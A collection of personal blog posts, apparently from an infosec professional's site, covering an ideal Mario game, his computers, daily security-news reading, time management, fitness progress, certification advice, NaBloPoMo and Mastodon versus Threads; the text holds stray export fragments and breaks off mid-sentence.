Bowser‚Äôs master plan? Just lulz? Other Mario games are relatively thin on ‚Äúplot‚Äù but Bowser has always been up to something - kidnapping Peach or really any type of kidnappings he does, conquering Mushroom Kingdom, etc‚Ä¶ Maybe it‚Äôs just nostalgia, but the map view is just not as exciting as this classic. The Perfect Mario GameWriting about what I liked and didn‚Äôt like about Super Mario Wonder got me thinking. What would make for the BEST Super Mario game? (Keeping this to just 2D side-scrolling). I‚Äôve listed below the features I would want to see (with the game that first featured it in parentheses). Rideable Yoshi‚Äôs with different abilities. Dopamine hit every time I had that Blue Yoshi man‚Ä¶ (Super Mario World) The P-Wing. Yeah it‚Äôs a cheat code, but it was always fun deciding when to use it and being real nervous about messing it up. (Super Mario 3) Characters with different native abilities. (Super Mario 2)) A more inspired world map. With lots of levels! (Super Mario World) More secret exits (Super Mario World) More difficult (Super Mario World-level difficulty) More bosses! Both mini-bosses and world bosses. (Super Mario 3, Super Mario World) Better power ups. Some of my favorites include fire flower (of course), super leaf (SM World), hammer suit (SM 3), lucky bell (the cat one from SM 3D World), metal cap (SM 64), Tanooki Suit (SM 3), wing cap (SM 64). Ya know what though? Just throw them ALL IN at once. More ‚Äúmystery‚Äù. Super Mario 2 had this, ‚Äúwhat is happening, and where do I go‚Äù aspect that I remember so fondly. More bonus levels. Super Mario 3D World bonus levels just kept going and going. Multi-player. (Pretty much standard at this point). Star system for unlocking new parts of the world and new levels (Super Mario 64, Wonder had something similar-ish with the Wonder Seeds. ) Per-level challenge system. (Super Mario 64 had 6 challenges per level) Plot-wise, I really enjoyed what Super Mario RPG did. Let Bowser be a good guy (and playable) and introduce a new team of big-bads. In fact, RPG had the best story by a mile, remember Bowser‚Äôs character arc? So good. Wonder Flowers were a TON of fun. Would love to see this mechanic tweaked a bit though for more replayability. Like initiating wonder flower effects from one level in a completely different level. Like‚Ä¶ the wonder flower effect could be randomized such that hitting one could cause a completely different effect in the level each time you hit it. Amazing‚Ä¶ Currency-system wise, do what Super Mario RPG did with frog coins. Imagine being able to buy unique power-ups, wonder-flower effects, badge-effects, etc with a currency that wasn‚Äôt so easiliy farmed? Could be fun. I don‚Äôt know how this gets incorporated, but I would love to see Mario Kart somehow baked into a standard Super Mario platformer, as a mini-game or something. I like all the per-level find-all-the-things challenges. Red coins, purple flower coins, stars, special flowers, all of ‚Äòem. Yoshi throwing eggs.

Mac Pro (2019): Typically my daily driver, tethered to my desk, wasn‚Äôt a great purchase in hindsight but seeing as that it‚Äôs likely Apple‚Äôs last Intel machine, it may have some extended value as I will be able to virtualize Intel/x86/x64 OS‚Äôs and run specialized software for the longest amount of time relative to any other Apple device. It also looks cool. Framework 13: Meant to be my roving device for blogging, development, and general cyber-ing. I have been slow to start using it for much so far though. Reason below‚Ä¶ iPad Pro (11in) - I recently became aware of the awesome utility of Stage Manager + External display support on the iPad Pro. Since then, I‚Äôve been using my iPad as my go-to at-the-desk daily driver as well as my on-the-move computer. It‚Äôs really eaten up these workflows with very little missing. Certain cybersecurity tooling, virtualization and running a test instance of Jekyll are notable feature deficiencies. iPhone (15 Pro Max): Technically a computer so I‚Äôm including it here. My carry-all-the-time companion. Capable for all email, web browsing, email-checking and most note-taking, etc‚Ä¶ Apple Watch Ultra: Included for fun, but does things (health/gym stuff) that other computers obviously could never replicate. MacBook Pro (15in, Intel-era, work computer): Solid machine, but one I just use for work. The Perfect ComputerHere I‚Äôll try to enumerate what would make for the ‚Äúperfect‚Äù all-in-one computer‚Ä¶ Touch-screen tablet (like an iPad) Has attachable peripherals (e. g. Magic Keyboard, pencil, etc‚Ä¶ like an iPad) Capable of running things like a terminal, virtualization (would be great if it could virtualize other architectures) &amp; containers Since I prefer the Apple ecosystem, it would preferably some version of iOS/iPadOS/MacOS Software support for software I run Support classic game console emulators and a cloud gaming service (e. g. Stadia, GeForce Now) for modern games Be able to connect to work VPN and use it for work when neededThis would be the EVERYTHING machine. Gaming, blogging, security research/testing, development, general productivity, social media, just‚Ä¶ everything!!! The iPad comes pretty close but misses in certain areas. Something like the Microsoft Surface might be the next closest, but is unfortunately Windows-based instead of Apple ecosystem. For now, it looks like I‚Äôm stuck with the iPad and the Mac Pro and I‚Äôll maybe ditch the Framework. Thanks for reading!

For what I do, staying on top of what is happening in the industry is very important. Couple that with an admittedly debilitating mild social media / phone addiction and you get a very routine course of daily reading. Below I will explain my daily routine for keeping up with cybersecurity news, research and more! Daily Infosec Reading RoutineComplete Checks: The items below represent feeds I fully check daily, and in many cases, multiple-times/throughout-the day. I‚Äôve also listed them in the order I typically check them. Mastodon: This has been my go-to Twitter replacement and fortunately the landing place for what seems like most of the infosec community. Check out who I follow here. RSS: Going old school, I subscribe to a lot of security blogs RSS feeds. Get a look at the sites I follow here. In my web travels, when I discover new sites that have RSS feeds, I will add them to this list as well! (I‚Äôm using the Reeder app on iOS/iPadOS and the Feedly web app on desktop. ) Lemmy / Kbin: These are my ‚ÄúThreadiverse‚Äù replacements for Reddit. You can see the communities/magazines I sub to here (Note: Not all of them are infosec-related). Reddit: Look, I‚Äôm not happy with Reddit, they killed third-party apps and attacked their community subs/mods. That said, some of the communities I enjoy live on, so I do (begrudgingly) browse new threads. Things I Check Sparingly: Below I‚Äôve listed feeds/platforms I check either as overflow from my primary reading or only once-in-a-while, either because the signal-to-noise ratio isn‚Äôt great or the feed is algorithmic, i. e. no way to ‚Äúread all of it‚Äù. Threads: Threads is a lively place but the infosec content there is very limited at this time. LinkedIn: There is OK infosec stuff here, if you can stomach sifting through all the insufferable content. BlueSky: A small infosec contingent here but nothing compared to Mastodon. Discord: There are a lot of infosec-related servers, but looking through all the different servers and their respective channels for interesting discussions/links is too time-consuming of a task. I don‚Äôt even have enough time most days to look at the Shellsharks Discord server. Podcasts: Though not technically ‚Äúreading‚Äù, I also have a couple infosec-related podcasts I tune in to when new episodes become available. Getting Into Infosec The Application Security PodcastWhen I find interesting articles, I save them to my read-it-later service (which is currently Pocket - though I plan on migrating to something else soon).

" }, { "id": 168, "url": "https://shellsharks.com/notes/2023/11/09/where-i-find-the-time", "title": "Where I find the time", "body": "2023/11/09 - I‚Äôm pretty busy. I‚Äôm a father, a husband and have a full-time job (in Cybersecurity fwiw). I have this blog that I frequently update, a podcast (that desperately needs my attention) and a ton of in-progress or neglected side projects. On top of all that, I spend a lot of time learning on the side, go the gym pretty much every day and like to travel. So where do I find the time? There are lots of ways to make time in the day, here are some strategies I employ (in no particular order)‚Ä¶ Sleep less: Some might argue this isn‚Äôt the healthiest strategy and they‚Äôre probably right. I am however one of those people who can get by on less sleep than maybe an average person (5-6 hours usually). Maybe it‚Äôs not something you make a habit of, or maybe you learn you can live on less sleep than you are used to getting. Either way, this is a simple technique for making extra time. Give things up: We all have time-wasting activities, some that are likely pretty chronic. Gaming, watching TV, scrolling social media, whatever it is - try to cut these things out completely to shore up time. Cut back: If giving things up completely isn‚Äôt an option, try instead to just cut back on something. Used to gaming an hour a day? Maybe try an hour every other day. Mobility: Having a mobile workstation, i. e. laptop, tablet, etc‚Ä¶, can give you the ability to do work anywhere in the house or on the go, including in the small windows of time you might otherwise not have been doing anything. As an example, when my son is busy with solo play or TV, I could use that as an opportunity to do a few quick tasks on my iPad! Multi-task: Doing more than one thing at a time can help you claw some time back. Can you take a meeting while you eat/make lunch? Life is full of waiting for things, is it possible to get some work done in one of the many waiting times you have in a day? Side-project selectivity: I‚Äôm a person who always keeps busy, always has ideas and always comes up with little side-projects. Over the years, this has led to a lot of half-finished/abandoned projects which amounted to little more than time wasted. I‚Äôve had the luxury of being able to afford wasting time throwing things at the wall and seeing what stuck, but these days, with time at more of a premium, I need to be more selective with what I choose to embark upon. So scrap the projects you know are going nowhere, focus on the ones with real finishing power and only pick up new ones that are truly important to you or that you know you can finish. Prioritize: Leverage some classic prioritization tools like to-do lists and calendar apps. Put all the meaningful things you need to do in your to-do app. Separate them into categories for home, work, side-project, etc‚Ä¶ Give yourself due dates and look at / prioritize your list daily (this is among the first things I do each morning). Use a calendar app too to keep track of events you have for the day/week/month. Plan around your events and cancel things you don‚Äôt need. Goals: Goals are very important in terms of how you spend your time. If you‚Äôre doing something that doesn‚Äôt progress you to achieving one or more of your goals, than you could probably cut it. Goals could be family, fitness, career, or other-related. Be Efficient: In doing anything, try to be more efficient at it. If doing task A would normally take you 30 minutes, find a way to do it in 20. Be better prepared, automate, know when things are ‚Äúgood enough‚Äù and find other process improvements. Having a constant motor, i. e. maximizing your time by constantly achieving things that progress to one of your goals takes discipline, but it also takes understanding what your goals are and what subtasks comprise those goals. There will be times throughout the day where you only have 1 minute, 5 minutes, 30 minutes or whatever to do something and you need to know how to fill that time with something productive. If I have a very short window, maybe I use that to do a quick workout (e. g. pushups, ab exercises, dumbbell curls) or I triage email or I write out a few quick thoughts for a blog post I‚Äôm working on. Keeping momentum is key here. Keeping the goal in mind is also crucial. It‚Äôs easy to slack off, get side-tracked or feel lazy and no matter how good you are, you will likely fall prey to this to some extent. But get yourself back on track by visualizing your goal and then get started again on the tasks that help you achieve it! In the end, you can‚Äôt do it all, so do what‚Äôs important. Remember to set aside time for yourself, though ideally that time would be goal-driven. Know your limitations and don‚Äôt burn yourself out!

Here I reflect and share some thoughts on where I started, what my plan has been, how it‚Äôs been going and what my ultimate goals are. My BackgroundI‚Äôve always been pretty lean, at certain points some might even say ‚Äúscrawny‚Äù. In highschool I was 6‚Äô2‚Äù and around 140 pounds. When I set off for college I was closer to 160 and after 4 long years (of ‚Äúintense studying‚Äù üòú) I began my post-university life at around 180. For years (like‚Ä¶ 10 years) I stayed in the 180-190 range, and then‚Ä¶ the pandemic hit. I stopped going to the gym (where I played a lot of basketball) and my diet went from bad to worse. Things definitely started to get away from me and I did virtually nothing to backfill the activity I had lost. I knew I was getting out of shape but having never weighed myself or really tried to do much intense physical activity, it was hard to tell how bad it had gotten. It wasn‚Äôt until I was at my grandmas house one day, she had a scale and I weighed myself and I realized something needed to change. I clocked in at 210 pounds (some 20-30 lbs heavier than usual), the first time I had ever been over 200 and obviously the heaviest I had ever been, and I felt it. This was the turning point for me. It wasn‚Äôt long after that that I signed up for the gym again and not only restarted playing basketball but also committed to lifting weights for the first time in my life. I had a plan, or something that resembled a plan and I was serious about losing weight and more importantly, getting stronger and in better shape. My PlanSo what was the plan? Pretty simple actually, albeit somewhat unspecific - eat better, lift weights at the gym 5-6 times a week, add in supplemental home workouts/exercises when appropriate and get back to playing basketball. The problem? I knew nothing about lifting weights and hadn‚Äôt a clue about how and what to eat to both lose weight while putting on muscle. Some learning and research was required‚Ä¶ To learn more about gym equipment and how to put together workout sets, I signed up for a personal trainer at my gym (Lifetime Fitness). I did a few sessions and learned the basics - proper form, how to use the machines, how to work different muscle groups, monitoring my heart rate and more! After that, I started putting together my own training splits. I enjoyed working with the trainer and wouldn‚Äôt mind continuing, but it is expensive and for me, I think I can put together my own plan after learning the basics. If I find in the future I am plateau-ing or otherwise looking to accelerate my progression, I may grab a few more sessions. For diet, I learned (both from my trainer and through some online research) that I needed to hit a certain protein threshold to gain muscle - approximately 1g of protein per pound based on my goal weight. Beyond that, I needed to simply monitor calories - calorie deficit to lose weight and surplus to put on weight. My trainer suggested I use a protein powder supplement (namely, Lifetime brand collagen peptides) to hit my daily protein number. I hadn‚Äôt heard of and wasn‚Äôt entirely sure what ‚Äúcollagen peptides‚Äù were but I‚Äôve been using it for over a year now and love it. The vanilla flavor tastes great in smoothies, is less heavy than traditional whey, and has good benefits for digestion, hair, skin, etc‚Ä¶ To help me more accurately hit my macro numbers (protein but also general calories) each day I use a calorie tracker app on my phone. At first I used MyFitnessPal and even paid for the subscription. The paid version gives you access to the barcode scanning feature which is important for quick adds to the app. More recently, I discovered the FoodNoms app which is very similar to MyFitnessPal and has the barcode scanning feature in the free tier. I canceled MyFitnessPal and now use FoodNoms. FoodNoms has a more attractive interface in my opinion but its catalog of foods is poor compared to MyFitnessPal. Fortunately, I can supplement FoodNoms lack of catalog with MyFitnessPal‚Äôs as it is offered for free. I am off and on with diligently tracking macros/calories. I think a calorie tracker is indispensible in the early days of a fitness journey as you need to learn more about what foods have what in them, how much to eat, etc‚Ä¶ Later, once you‚Äôre in more of a routine and have a decent idea of what you‚Äôre putting into your body you can lay off more diligent tracking. When I first started my personal training sessions and actually lifting weights I was over 200 pounds (202 to be exact-ish) and at just over 20% body fat. So how‚Äôs it been going since then? How it‚Äôs goingIt‚Äôs been just over a year since I first started lifting weights and eating better, my ‚Äúfitness journey‚Äù if you will. Overall, it‚Äôs going great! Some minor setbacks here and there but for the most part, I have been sticking with it and seeing results. Due to my current family life and work situation, I tend to go to the gym late, like 8pm+. I don‚Äôt mind this as I am usually up late anyways, tend to have a good amount of energy, even at that time, and being there late gives me the ability to take my time with the workout versus an early morning or lunch-time workout where I would feel rushed to get back to work. The gym tends to be less crowded at this time too which is a plus. Up until recently, when at the gym I had my pick between lifting weights or playing pickup basketball and many a night, doing both. This was until Lifetime made the horrific decision to close BOTH of their basketball courts in favor of installing pickleball courts (one such example). My rage at this decision can not be described using words of human tongue, so I won‚Äôt try. I‚Äôll just say, I don‚Äôt get it, and I‚Äôm sad that I can no longer play basketball at the gym and now need to find a new place to play, which means likely having to find a new gym altogether. It‚Äôs been a few weeks since I‚Äôve played basketball and not only can I feel the effects, I just miss playing. The cardio is important for my fitness but I also get an emotional release from playing so I need to find that again. My day-to-day training splits have evolved over time. I‚Äôve added, subbed and removed exercises to build a mildly efficient but seemingly effective workout routine to help me net the gains I am looking for. I‚Äôm still no expert by any means and am always looking to learn and tweak the regimen. I actually get a lot of ideas for what to add to my routine through fitness ‚Äúinfluencers‚Äù on Instagram. The hardest part of ‚Äúgetting in shape‚Äù, or losing weight is not lifting weights/working out, it‚Äôs not even achieving the consistency of exercising every day. The hardest part is eating right. For me (and many others) exercise is fun! There is a chemical release associated with exercise and a primal satisfaction from using your body, the muscles, to do stuff. What isn‚Äôt fun is eating healthy - hah! Eating right means focusing on healthier foods which means less sugar, less carbs and less fats (very generally speaking). Thus, eating healthier means sacrificing at times, related to eating foods you may prefer taste-wise. What makes eating right a lot of work is the planning and prepping, plus the constant vigilance in not straying too far from the plan week in and week out. I‚Äôve never really eaten healthy. I‚Äôve always been lean, always very active and my metabolism is maybe just good or something. Whatever this combination has been, it has let me compensate for the fact that I have never had a particularly healthy diet. To my credit, there are certain things I was always good at staying away from (i. e. soda), but I ate a lot of sweets, fried foods, drank a lot of beer, etc‚Ä¶ Well once the pandemic came through, my diet stayed the same (or even got worse) but my exercise fell off a cliff. During this period of time where I‚Äôve been looking to get in better shape I haven‚Äôt done a crazy amount of meal planning. There have been some weeks where I looked up ‚Äúhealthy‚Äù or otherwise protein-heavy meals and made them but for the most part I‚Äôve stuck with a few reliable dishes, making them again and again. Notably, a gym rat‚Äôs go-to, chicken + rice + vegetables of some kind. Outside of chicken and rice, I tend to just focus on meals that are high-protein, even if they aren‚Äôt particularly low calorie. For now, I‚Äôve been more focused on putting on muscle rather than dropping pounds. I wouldn‚Äôt say I‚Äôve ever tried to go through a ‚Äúbulking‚Äù phase, but rather just not caring whether I gain or lose weight at this point. That said, with my beach trip coming up I know I‚Äôm going to want to go through a cut just to lose as much of the unwanted belly fat as I can. This is a problem for future Mike at this point =). Steak is one thing I haven‚Äôt had much of in the last year or so but that I have been planning on adding as a (probably weekly) part of my diet. It‚Äôs delicious and of course high protein. Though it‚Äôd be great if I had a bunch of diverse, delicious, healthy, protein-packed recipes/meals at my disposal, I‚Äôm happy with the fact that I can eat the same thing every day and not really get sick of it. Challenges: So what challenges have I faced? Despite the fact that I‚Äôve had a second baby in this time, I‚Äôve been fortunate to have the time (and energy/motivation) to continue going to the gym at night. I‚Äôve seen decent results, even if not the most accelerated gains and this has helped continue to motivate me with respect to consistently going. The biggest set backs have been illness (which I will admit isn‚Äôt overly frequent, but is unavoidable thanks to having one kid in daycare) and diet flubs (i. e. sweets, alcohol, etc‚Ä¶). Look, I don‚Äôt police myself too hard on diet and I allow myself to have the things that I like, but I do feel guilty when I have a beer these days. It‚Äôs just not something I really crave any more and I set myself back unnecessarily by having the lapse in discipline. When I go out with friends or to a restaurant with my wife, I like to have a drink, but do I really need one when just at the house? I need to master saying ‚Äúno‚Äù to myself. My forthcoming challenge? Holiday season. This means delicious treats, cold weather keeping me inside and my favorite kinds of beers (i. e. heavier, sweeter stouts and the like). This combination of ‚Äúunhealthier‚Äù foods coupled with not wanting to go outside to get my normal daily cardio might be a source of setback so I need to be vigilant! Measuring Progress: So how can I measure progress? I can‚Äôt say I‚Äôve done a great job tracking this and I really wish I had done some more measurements or even a picture of myself when I first started the ‚Äújourney‚Äù. I do have some rough numbers to go by in terms of measuring my progress though and more qualitatively I can see physical/visual changes in my appearance. Let‚Äôs look at a few numbers I‚Äôve captured I mentioned that when I first started going to the gym in October-ish of 2022 I was 202 pounds and over 20% body fat. I measured myself again 2 months later in December and clocked in at 203 pounds but only 16% body fat. A pretty big drop! A steadfast commitment to my diet and playing a lot of basketball at the time probably had a lot to do with it. I measured myself again in September of this year (2023) and came in at 200 pounds (so pretty much the same weight) but now 12% body fat. Amazing! I don‚Äôt really have a body fat % goal but I‚Äôm happy to see that I‚Äôm maintaining weight while dropping fat. This means I‚Äôm replacing the fat with muscle. The only other measurement I really have to help determine progress is to look at how much weight I‚Äôm lifting for different exercises. I‚Äôm not going to list every exercise I do, the weight I was lifting when I started and the weight I lift now, but I will provide some examples. Chest is a big focus of mine. I‚Äôve (clearly) never really had much in the way of chest muscles and it showed. I had some trouble even with the bar (45 lbs) when I first started, though I remember putting 20-50 extra lbs on there for some reps when I was in my early training sessions. Now, I‚Äôve hist 155-ish on bench press and 140 for dumbbells. Not bad! For arms, I was probably doing 25‚Äôs for my curls and do 40‚Äôs now. Similarly, I was probably doing 25‚Äôs for dumbbell military presses (shoulders) and do 55‚Äôs now. For leg day (which I actually enjoy) I went from squatting 115 maybe to doing well over two plates (so 225+ lbs). Anyways, I don‚Äôt know if this comes off as braggy or anything, hopefully it does not. As I‚Äôve said before, I‚Äôve never lifted weights. 34 years of my life came and went and I had never actually went to the gym and lifted. What this says to me and I hope says to others is that with a little commitment and discipline you can see some decent progression in a relative short amount of time. Ok awesome! Things have been going pretty good I think, but what are my goals? Where do I want to be? My goalsIt‚Äôs hard to describe in any sort of exact way what my ‚Äúgoals‚Äù are. I have an idea of how I want to look but I don‚Äôt have any overtly specific strength goals or body fat % goals. I have two young kids so keeping up with them both from a stamina and picking-them-up-and-playing-with-them perspective is key. Aesthetically, losing the gut and boosting upper body muscle (chest + arms) is a goal. I‚Äôd like to stay in the 200-210 pound range while maintaining some amount of lean-ness. For my height (6‚Äô2‚Äù) this requires putting on a fair bit of muscle I think. I‚Äôm not looking to be ‚Äúshredded‚Äù or anything, I just want to maintain an athletic build that is in fact athletic (i. e. I can run, play sports, keep up with my kids, etc‚Ä¶) More tactically, my goal isn‚Äôt to just reach a certain physique, but to reach it and then maintain it. This means building better habits around exercise and diet. To do so, I need to have consistency and efficiency in how I go about it. In the last year, I‚Äôve spent MORE time trying to right the (health) ship then I would like to once I hit maintenance mode. Not that I don‚Äôt enjoy working out, but I have other responsibilities and time is one currency that is hard to claw back. I want eating right to be second nature and I want to have an exercise program that allows me to maintain a certain strength/physique without me having to spend more hours than I need to at the gym. ConclusionI don‚Äôt have any grand summary. I think I‚Äôve said it all in the ramblings above. I‚Äôm glad I recognized the unhealthy path I was on at an ‚Äúearly‚Äù stage and sought to correct it. I‚Äôm fortunate to have the time, resources and support from my family to allow me to work towards it. For any one else out there like me who sees themselves in progressively worse shape and wants to turn it around but knows nearly nothing about doing it, maybe my story can be helpful. Sit down, make a plan for exercise and diet and then execute on it. It‚Äôs not easy, but I promise it can be fun and rewarding in relative short order. Thanks for reading!

I‚Äôm here to tell ya, stop worrying about certification paths. The question of what cert to get is actually pretty easy, go look at job reqs for jobs you are interested in and see what they‚Äôre asking for. That‚Äôs your easy answer. A better question is, what trainings should I take, rather than what certifications. After all, the training is what helps you learn and acquire skills, versus the certification which just helps you get letters for your resume or LinkedIn profile. Skills help you net experience and experience will always be king. Experience is what will ultimately give you opportunities. Take it from me, as someone who has an insane amount of certifications, career progress is not directly proportional with certification progression. If it was, I‚Äôd be one of the most successful infosec professionals in the world. Don‚Äôt get me wrong, I‚Äôm doing just fine in my career, but the value of having a cert or multiple certs follows a pretty extreme diminishing returns curve. The first one, or two, can really help open doors, but beyond that companies/hiring managers rarely care.

You still need to prove your experience and nail an interview. A better way to build a ‚Äúpath‚Äù is to develop a learning roadmap. There isn‚Äôt one way to best do this, but one way you could do it is by taking a few job reqs that you are targeting, figure out what skills they require and then work on finding trainings and other ways to get those skills. It may turn out that there actually is a very one-to-one path that would map to known certification-based training and in that very unlikely scenario, sure, just go off and try to get those certifications and take their associated training courses. I will caution again though, for most certs, the trainings hardly count as real experience. Either the course is too ‚Äúspoon-feedy‚Äù or you just barely get exposure to the subjects. Too often you walk away without really having learned the subjects at hand. Only by taking time outside the window of the course training can you really learn by doing and learn by failing. There are some exceptions, Offensive Security is a pioneer in the (feared) ‚ÄúTry Harder‚Äù approach to practical training. With OffSec courses, moreso than other training providers, it does seem like you‚Äôre forced to actually learn something if you want to be successful getting the certification. So my advice, stop worrying about certs, stop worrying about letters and start thinking about what you want to learn.

I‚Äôm half-way through my first NaBloPoMo and so far I‚Äôve managed to write something for each day. Some takeaways and observations below‚Ä¶ The Front 15 During &gt;Shark week I have a similar challenge to NaBloPoMo - publish a bunch of content rapid-fire. That is only a week of posts though versus what I‚Äôve been trying to accomplish here, which is write for 30 straight days! That said, the daily drop during &gt;Shark week is typically more substantial than what I‚Äôve been releasing each day during NaBloPoMo. The only rule for myself during NaBloPoMo was to publish something each day. This rule has allowed me to write about any topic and do so in very short-form if I wish. In only the first ~2 weeks I‚Äôve managed to write about a wide range of topics including Apple, gaming, technology, infosec, travel, food, life hacks &amp; fitness! I‚Äôm very pleased with the even diversity so far. The addition of notes on my site has really allowed me to experiment with shorter-form content, perfect for something like NaBloPoMo. I‚Äôve been syndicating a number of posts to social media (e. g. Mastodon, Threads, Lemmy) and have gotten mixed engagement. A number of things I haven‚Äôt even bothered to share out. Maybe I will one day but for now, those pieces will be reserved for anyone who subscribes to my notes RSS feed. Often I find that when I write, the process of writing tends to spawn ideas for future topics/posts. Interestingly, this really hasn‚Äôt happened with what I‚Äôve written over the first 15 days. I‚Äôve written every single post/note and published them to my blog all using my iPad Pro. It‚Äôs pretty capable! The Back 15 A stretch goal for myself was to hit 50k words across all posts associated with NaBloPoMo (this is the traditional goal for those participating in NaNoWriMo). Including this write-up, I‚Äôll be hovering around 10k total words through the first 15 days, so unless I start writing some beefier posts I probably won‚Äôt hit that goal. At the start of the month I brainstormed 30-ish topics to write about and have been working my way through those ideas. Looking at what‚Äôs left in the list, I can see that I‚Äôve taken a lot of easier-to-write-about topics to start the month, leaving myself a lot more work in the back half. I‚Äôm stoked with what I have planned for the remainder of the month, just need to buckle down and write, write, write!

The Fediverse is good for you", "body": "2023/11/16 - Though I consider myself Mastodon-first, I also am relatively active on Threads. One thing I see quite often are people with quick takes on how Mastodon ‚Äúsucks‚Äù and no one cares about ‚Äúfederation‚Äù. Since Threads only offers me 500 characters (in a single thread) to respond to these folks, I wanted to write up a longer piece here that I can share, which details the benefits of federation and the ActivityPub platform for Threads users and also talk a little bit about why Mastodon is actually pretty great! ActivityPub, the Fediverse and Why You Should CareActivityPub (‚ÄúAP‚Äù) support is coming to Threads, as said by the head of Instagram himself. With AP in place, Threads can then become part of the ‚ÄúFediverse‚Äù, which can be thought of as the larger network of interconnected platforms that can communicate with one another using AP as the underlying protocol. So how does Threads and its users benefit from joining the Fediverse? I‚Äôll explain by desribing the interoperability and portability benefits. Interoperability: All other platforms that are on the Fediverse can interact with each other using AP. Mastodon has traditionally been the largest AP-enabled platform but what else is part of the Fediverse? Here‚Äôs a list of AP-enabled platforms. Yes, this list is mostly represented by small projects but more recently, WordPress has brought their AP plugin online which allows WordPress sites to federate and therefore be followable by any other account on the Fediverse. This is huge as WordPress makes up ~40+% of the entire Internet. Now you can follow websites directly from your Threads account and/or use your WordPress site as an identity/account for social media, also within the Fediverse. Amazing! Now imagine other large platforms (i. e. Tumblr, Flipboard, Medium, Mozilla) implementing AP support and what that could mean for you as a Threads user and for the Internet as a whole? Imagine instead of sharing a screenshot or link to a website or other social media platform post you could natively share it directly on whatever platform you were on! Portability: When Twitter crumbled, people were at a loss. Stay, despite the descension into a hellsite? Or leave, abandoning your followers and having no real place to set up shop next? A number of other platforms gained traction at that time, Threads, Mastodon, BlueSky, etc‚Ä¶ but for each of them you now had the task of rebuilding your following and making a new network. For some, having an existing Instagram graph helped bootstrap their Threads following, but for many, they were at 0 once again. With AP support, you would in theory be able to pick up your account from Threads and port it over to another platform completely (like Mastodon), your followers would come with you keeping your graph and identity intact. This adds a resilience not accessible with traditional centralized platforms and helps mitigate other issues like deplatforming. Threads adopting ActivityPub and amassing the larget user-base of the Fediverse could cement them as the eternal dominant player in the social space. That said, if the platform were to enshittify for all the reasons these services typically do, users would not be stranded. Great! These are probably the two biggest features AP offers to Threads users, but other benefits exist too! Why Mastodon / Fediverse is goodLet me address the other comment I‚Äôve seen on Threads quite a bit - that Mastodon ‚Äúsucks‚Äù or is just for weird anarchists, furries or techies. The uncorporate and privacy-concious qualities of Mastodon DO make it a nice place for these communities, but these same characteristics and other benefits also make it a nice place for really any community! Here‚Äôs a list of benefits of an open and decentralized network. Follow-fueled, chronological timeline. Tired of seeing certain types of content thrust into your feed? Worry no more! Mastodon does not rely on an algorithmic timeline. You see only what you follow and what your follows boost. If your interested in an algorithmic feed, some Mastodon clients are starting to build this functionaity into their apps. Mastodon has no ads and there is no one trying to monetize your existence and use of the platform. The anti-viral nature of an algorithm-less timeline means no (or less) rage/engagement-baiting for the sake of driving platform engagement. Similarly, the lack of an algorithm driving what appears in the timeline means no opportunity for algorithmic-downranking of posts. Did I mention that you aren‚Äôt monetized? You are not the product. No influencers or brands clogging up your timeline. That said, you‚Äôre free to follow either if you choose! Everything from your Mastodon instance (server) to the client you use is customizable. There are third-party apps/clients. If you are so inclined, you can self-host your own Mastodon instance! This is a great way to prove the authenticity of your account, to improve ‚Äúbranding‚Äù and a great vanity piece. You have more control over data ownership. It‚Äôs open source! The glitch-soc fork offers a number of improvements to the out-of-the-box Mastodon experience. Mastodon is by nature, ‚Äúdecentralized‚Äù. This adds resilience and more to the network. Contextual, community-run moderation. On Threads, you rely on Facebook‚Äôs one-size-fits-all moderation approach. With Mastodon, each instance performs their own moderation so you get a much more custom, tailored approach to moderation. Deplatforming/censorship resistance. Since you can move accounts and host your own federated instance, you can make yourself extremely resilient in the face of possible deplatforming/censorship. The Fediverse has by far the most interoperability with other networks. You can interface with the entire universe of AP-compatible networks while also engaging with those on Bluesky, Threads, Nostr and more. Mastodon isn‚Äôt owned by Facebook*, a billionaire or any one person‚Ä¶Mastodon isn‚Äôt perfect: I‚Äôve really enjoyed my time on Mastodon thus far, but it isn‚Äôt without some downsides‚Ä¶ Mastodon is a network of disparate hosted instances. Drama often descends upon the Mastodon meta and instance admins are faced with decisions on whether to defederate from other instances. Account migration exists but needs a tune up. It‚Äôs not entirely intuitive and does not port follows or historical posts. For users on smaller instances, reachability has technical challenges. Discoverability is hard at first. With no algorithm to speed along finding interesting accounts, some word is required to find who you want to follow. Wrap-upWhether you choose Mastodon or Threads shouldn‚Äôt matter much in a future world where both leverage AP, just choose whichever you feel comfortable with. If you‚Äôre on Threads and you love it that‚Äôs great! As a Threads user, you should be excited about an AP-enabled Threads future and should continue to advocate to Threads devs to implement this.

Everyone seems to have a ‚Äúfavorite‚Äù and it‚Äôs very in right now to put one network on blast, post about it and watch the likes rain down upon you. Like with any other similar debate, Mac vs. Windows, iOS vs. Android, you name it - it honestly just comes down to personal preference, subjective criteria and context - what are you trying to get out of your social platform? For me, and I‚Äôve been very vocal about this for over a year now, Mastodon is my favorite social network. I have them all (except ‚ÄúX‚Äù these days), Threads, Bluesky, LinkedIn, all of ‚Äòem. I can see the individual appeal for most of these and will concede that for certain types of content or interactions, one platform may be superior to another, even over my darling Mastodon. For example, the LinkedIn timeline is mostly awful but it‚Äôs a medium that will still be superior for speaking with recruiters (duh). But let me talk about Threads‚Ä¶ From a daily active users perspective, Threads has quickly become the obvious ‚Äúnext Twitter‚Äù. I‚Äôm on Threads and like it for certain types of content but there is a hollowness to what I see on there. My timeline, even after using it for months so it has become a little less wild, is still filled with brands, bot accounts, influencers, shit-posters, follower-beggars and general folks who seem bored and just post random one-liners. I‚Äôm not saying this makes for a bad social network or a bad experience for others. Hell, these types of posts seem to get A LOT of interaction/engagement. Likes, comments, whatever. This is, from what I can tell, what people want to do and how can I argue objectively that Threads is worse as a social platform when people seemingly are being very social on it, even if those interactions seem somewhat superficial to me. Here are some example screenshots of what my timeline looks like on Threads‚Ä¶ Notice the reply and like counts! Socializing! On Mastodon, (imo) there is just more substance. My timeline is filled with technical analyses, links to blogs, real people trying to meet up, genuine questions (not just crap like ‚Äúwhat‚Äôs your favorite soda?‚Äù), published research from the authors themselves, breaking news in niche domains, etc‚Ä¶ Yeah, I still have some shit-posting and casual commentary but it doesn‚Äôt dominate my feed. Mastodon doesn‚Äôt employ an algorithm, so my feed is exactly what I want it to be in terms of what I‚Äôve been able to discover and follow. This means the signal-to-noise ratio on Mastodon will always be better than other algorithmic social platforms. But is it ‚Äúsocial‚Äù? What I mean is, yes the content is great, but are there real interactions? The answer is tricky. Sometimes yes, sometimes not as much. Mastodon (as it stands now) has a decent daily active user base, nothing compared to Threads though. And within the daily active users across the entirety of Mastodon, there are silos of users, cross-sections of the entire user base that can even see what you post thanks to the way federation works, who follows you and the fact that there is no 